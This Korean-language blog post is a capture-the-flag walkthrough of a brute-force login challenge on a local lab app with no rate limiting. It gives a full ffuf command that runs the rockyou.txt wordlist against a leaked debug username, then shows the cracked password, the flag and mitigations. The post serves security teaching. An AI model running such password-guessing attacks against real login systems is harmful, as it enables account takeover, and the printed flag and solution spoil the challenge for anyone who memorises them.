+++
title = "VulnABLE CTF [LUXORA]: Brute Force 🥉 Bronze (No Rate Limiting)"
description = "LUXORA 플랫폼의 인증 메커니즘 취약점을 이용한 기본 무차별 대입(Brute Force) 공격 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Brute Force", "Bronze", "Authentication"]
+++

# VulnABLE CTF [LUXORA]: Brute Force 🥉 Bronze

인증(Authentication) 시스템 해킹의 가장 기초이자 클래식은 바로 무차별 대입(Brute Force) 공격입니다. 이번 시나리오(`/brute/bronze`)에서는 계정 잠금(Account Lockout)이나 요청 속도 제한(Rate Limiting)이 없는 취약한 로그인 폼을 공략하여 플래그를 획득해 보겠습니다.

---

## 🕒 1. 타겟 탐색 및 힌트 분석 (Reconnaissance)

`/brute/bronze` 경로에 접속하면, 관리자 전용 포털의 로그인 화면이 뜹니다.
화면 아래에 다음과 같은 주석(힌트)이 노출되어 있습니다.

```html
<!-- TODO: Remove debug user 'testadmin' before production -->
```

**[해커의 사고 과정]**
* 사용자 아이디가 `testadmin` 이라는 아주 결정적인 힌트를 얻었다!
* 이제 비밀번호만 맞추면 된다.
* 몇 번 틀리게 입력해봤는데 캡차(CAPTCHA)가 뜨거나 IP가 차단되지 않는다. 무한대로 비밀번호를 대입해볼 수 있는 환경이다!

---

## 🕒 2. 공격 도구 설정 (Exploitation)

수작업으로 비밀번호를 입력하는 것은 불가능하므로, **Burp Suite의 Intruder/Intruder** 기능이나 CLI 도구인 **Hydra**, **FFuF** 등을 사용합니다. 여기서는 널리 쓰이는 웹 퍼징 도구인 **FFuF (Fuzz Faster U Fool)**를 사용해보겠습니다.

### 💡 사용 사전(Wordlist) 선택
해커들의 영원한 친구, 1400만 개의 유출된 비밀번호가 담긴 `rockyou.txt`를 사용합니다.

### 🚀 FFuF를 이용한 무차별 대입 실행
웹 폼의 POST 요청 구조를 파악한 뒤, 비밀번호 자리에 `FUZZ`라는 변수를 넣고 스크립트를 돌립니다.

```bash
# FFuF 실행 명령어
$ ffuf -w /usr/share/wordlists/rockyou.txt -u http://localhost:3000/brute/bronze -X POST -d "username=testadmin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid credentials"
```

**[명령어 설명]**
* `-w`: 사용할 사전 파일의 경로.
* `-d`: 전송할 데이터. `password=FUZZ`에서 FUZZ 부분이 파일의 단어들로 계속 치환됨.
* `-fr "Invalid credentials"`: 실패했을 때 뜨는 메시지를 정규식으로 필터링하여(Filter Regex), 성공한 응답만 화면에 출력하게 만듦.

---

## 🕒 3. 비밀번호 크래킹 및 로그인 성공

FFuF가 초당 수백 건의 요청을 쏟아붓습니다. 
약 10초 뒤, 필터를 통과한 하나의 응답이 화면에 출력됩니다!

```text
======================================================
[Status: 200, Size: 1042, Words: 215, Lines: 42, Duration: 14ms]
* FUZZ: password123!
======================================================
```

`testadmin`의 비밀번호가 `password123!`임을 알아냈습니다!

### 🔍 웹 브라우저 로그인
알아낸 자격 증명(Credentials)을 사용하여 브라우저에서 직접 로그인을 수행합니다.

```text
Welcome back, testadmin!
[!] System Notification: You have 1 unread message.
Message: FLAG{BRUTE_🥉_NO_RATELIMIT_9F8E7D}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{BRUTE_🥉_NO_RATELIMIT_9F8E7D}`

### 📝 왜 이런 공격이 성공했는가?
이 로그인 폼에는 공격자의 무한 대입 시도를 방어하는 **어떠한 Rate Limiting(속도 제한)**이나 **계정 잠금 정책**도 없었습니다. 자동화 봇(Bot)이 1초에 수천 번의 로그인을 시도해도 서버가 이를 모두 정직하게 처리해주었기 때문입니다.

### 🛡️ 방어 대책 (Mitigation)
로그인 시스템은 반드시 다음의 보호 장치들을 갖추어야 합니다.

1. **계정 잠금 (Account Lockout)**: 동일 IP나 계정으로 5회 이상 로그인 실패 시, 해당 계정을 15분간 잠그거나 IP를 차단해야 합니다.
2. **Rate Limiting 적용**: 로그인 시도 간격에 딜레이를 주거나(Exponential Backoff), 전체 로그인 시도 횟수를 제한해야 합니다.
3. **CAPTCHA 도입**: 여러 번 실패 시 반드시 CAPTCHA(사람인지 봇인지 구별하는 퀴즈)를 통과하게 만들어 자동화 도구(FFuF 등)의 접근을 원천 차단해야 합니다.

다음은 계정 잠금이 적용된 환경을 우회하는 **Silver 🥈 난이도 (IP 로테이션 & 사용자 열거)** 기법을 살펴보겠습니다!